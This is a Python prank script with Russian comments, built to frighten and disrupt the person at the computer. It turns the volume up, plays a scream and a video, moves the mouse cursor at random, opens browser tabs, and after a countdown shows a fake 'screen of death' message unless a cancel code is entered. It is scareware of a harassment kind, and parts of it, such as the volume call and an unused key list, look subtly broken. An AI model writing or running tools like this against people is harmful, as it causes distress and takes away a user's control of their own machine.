import os
import pygame
import tkinter as tk
from tkinter import simpledialog
import webbrowser
import time
import threading
import random
import ctypes
import sys

# === НАСТРОЙКИ ===
SOUND_FILE = "scream.mp3"  # положи в ту же папку
VIDEO_FILE = "video.mp4"   # или .mpg/.avi
STOP_CODE = "1337"         # код отмены
BLUE_SCREEN_KEYS = ["x", "y", "u"]  # клавиши для отмены BSOD
stop_signal = False        # флаг остановки

# === 1. ЗВУК НА МАКСИМУМ ===
def max_volume():
    if os.name == 'nt':  # Только для Windows
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x319, 0, 100000)  # 100% громкость

# === 2. ЗАПУСК АУДИО → ВИДЕО → ОТСЧЁТ ===
def play_media():
    global stop_signal

    # A. Звук
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(SOUND_FILE)
        pygame.mixer.music.set_volume(1.0)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy() and not stop_signal:
            time.sleep(0.1)
    except Exception as e:
        print(f"Ошибка звука: {e}")

    # B. Видео (если не нажали стоп)
    if not stop_signal and os.path.exists(VIDEO_FILE):
        if os.name == 'nt':
            os.system(f'start "" "{VIDEO_FILE}"')  # Windows
        else:
            os.system(f'xdg-open "{VIDEO_FILE}"')  # Mac/Linux

    # C. Обратный отсчёт 10 минут
    for i in range(600, 0, -1):
        if stop_signal:
            return
        time.sleep(1)

    # D. Фейковый синий экран (если код не ввели)
    if not stop_signal:
        os.system('cmd /c "echo ЭКРАН СМЕРТИ АКТИВИРОВАН && color 17 && timeout 5"')

# === 3. ХАОС: ДВИЖЕНИЕ МЫШИ И ВКЛАДКИ ===
def chaos():
    urls = [
        "https://google.com",
        "https://youtube.com",
        "https://github.com"
    ]  # Свои ссылки
    while not stop_signal:
        # A. Дёргаем мышью
        x, y = random.randint(0, 1920), random.randint(0, 1080)
        ctypes.windll.user32.SetCursorPos(x, y)

        # B. Открываем вкладки
        if random.random() < 0.1:  # 10% шанс
            webbrowser.open(random.choice(urls))

        time.sleep(0.5)

# === 4. ПРОВЕРКА КОДА ОТМЕНЫ ===
def check_code():
    global stop_signal
    root = tk.Tk()
    root.withdraw()  # Скрываем окно
    code = simpledialog.askstring("ОШИБКА", "ВВЕДИТЕ КОД ОТМЕНЫ:")
    if code == STOP_CODE:
        stop_signal = True
    root.destroy()

# === ЗАПУСК ===
if __name__ == "__main__":
    max_volume()
    threading.Thread(target=chaos, daemon=True).start()
    threading.Thread(target=play_media, daemon=True).start()
    check_code()  # Блокирующий вызов
    os._exit(0)   # Завершаем процесс
